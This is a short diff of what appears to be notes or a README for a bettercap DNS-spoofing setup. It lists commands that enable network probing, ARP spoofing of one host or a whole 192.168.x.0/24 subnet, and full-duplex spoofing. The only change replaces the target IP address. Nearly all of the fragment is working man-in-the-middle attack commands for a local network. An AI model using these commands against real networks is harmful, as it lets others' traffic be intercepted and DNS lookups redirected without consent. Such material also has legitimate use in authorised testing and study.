@@ -21,6 +21,6 @@ sudo bettercap -iface eth0 -caplet dns-spoof.cap
 net.probe on
 net.recon on
 arp.spoof on
-set arp.spoof.targets 192.168.1.100  #OR
+set arp.spoof.targets 192.168.31.144  #OR
 set arp.spoof.targets 192.168.1.0/24  # to spoof dns for whole network
 set arp.spoof.fullduplex true
